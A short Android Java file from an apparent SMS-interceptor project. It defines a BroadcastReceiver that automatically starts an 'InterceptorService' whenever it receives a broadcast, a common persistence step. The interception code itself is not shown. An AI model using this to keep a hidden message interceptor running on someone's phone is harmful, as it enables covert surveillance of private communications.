package com.example.smsinterceptor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * Created by stephen on 13-7-14.
 */
public class AutoStarter extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        context.startService(new Intent("com.example.services.InterceptorService"));
    }
}
